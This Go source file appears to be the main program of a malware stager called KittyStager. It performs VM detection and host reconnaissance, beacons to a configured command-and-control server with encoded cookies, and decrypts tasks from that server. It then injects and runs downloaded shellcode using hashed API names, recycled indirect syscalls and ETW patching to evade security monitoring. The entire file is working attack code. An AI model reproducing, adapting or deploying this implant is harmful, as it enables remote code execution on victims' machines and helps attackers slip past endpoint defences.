package main

import (
	"KittyStager/cmd/crypto"
	"KittyStager/cmd/malwareUtil"
	"KittyStager/cmd/util"
	"crypto/sha1"
	_ "embed"
	b64 "encoding/base64"
	"encoding/hex"
	"fmt"
	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"golang.org/x/sys/windows"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

//go:embed conf.txt
var t string
var (
	sleepTime int
	body      []byte
)

// Shellcode injection comes from this repo
// https://github.com/timwhitez/Doge-Gabh/blob/main/example/RecycledGate/popcalc/popcalc.go

func main() {
	malwareUtil.VmCheck()
	var err error
	//get the shellcode by http
	conf := strings.Split(t, ",")
	sleepTime, err = strconv.Atoi(conf[2])
	if err != nil {
		return
	}
	//initial recon
	host := malwareUtil.Recon()
	initChecks, err := util.InitUnmarshalJSON(host)
	if err != nil {
		return
	}
	cookie := b64.StdEncoding.EncodeToString(host)
	cookieName := b64.StdEncoding.EncodeToString([]byte(initChecks.GetKittenName()))
	//initial request
	// try to connect to the server
	for {
		body, err = malwareUtil.Request(cookie, conf)
		if err != nil {
			malwareUtil.Sleep(sleepTime)
		} else {
			break
		}
	}
	for {
		body, err = malwareUtil.Request(cookieName, conf)
		// if the response is not a shellcode, sleep and try again
		if len(body) < 10 {
			malwareUtil.Sleep(sleepTime)
		} else {
			key := crypto.GenerateKey(initChecks.GetHostname(), 32)
			hexSc, err := crypto.Decrypt(body, []byte(key))
			if err != nil {
				return
			}
			task, err := util.TaskUnmarshalJSON(hexSc)
			if err != nil {
				return
			}
			switch task.Tag {
			case "shellcode":
				shellcode, err := hex.DecodeString(string(task.Payload))
				if err != nil {
					return
				}
				//inject the shellcode
				inject(shellcode)
				return
			case "sleep":
				sleepTime, err = strconv.Atoi(string(task.Payload))
				if err != nil {
					return
				}
				malwareUtil.Sleep(sleepTime)
			}
		}
	}
}

func inject(shellcode []byte) {
	var thisThread = uintptr(0xffffffffffffffff)
	alloc, _ := gabh.MemHgate(str2sha1(string([]byte{'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), str2sha1)
	protect, _ := gabh.MemHgate(str2sha1(string([]byte{'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), str2sha1)
	createthread, _ := gabh.MemHgate(str2sha1(string([]byte{'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x'})), str2sha1)
	pWaitForSingleObject := syscall.NewLazyDLL("kernel32.dll").NewProc("WaitForSingleObject").Addr()
	createThread(shellcode, thisThread, alloc, protect, createthread, uint64(pWaitForSingleObject))

}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, pWaitForSingleObject uint64) {
	malwareUtil.EtwHell(handle)
	var hashhooked []string
	var baseA uintptr
	regionsize := uintptr(len(shellcode))

	callAddr := gabh.GetRecyCall("", hashhooked, str2sha1)

	r1, r := gabh.ReCycall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		callAddr,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		windows.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}

	//copy shellcode
	malwareUtil.Memcpy(baseA, shellcode)

	var oldprotect uintptr
	callAddr = gabh.GetRecyCall("NtDelayExecution", nil, nil)

	r1, r = gabh.ReCycall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		callAddr,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}

	var hhosthread uintptr
	callAddr = gabh.GetRecyCall("", nil, nil)

	r1, r = gabh.ReCycall(
		NtCreateThreadExSysid, //NtCreateThreadEx
		callAddr,
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.Syscall(uintptr(pWaitForSingleObject), 2, hhosthread, 0xffffffff, 0)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}
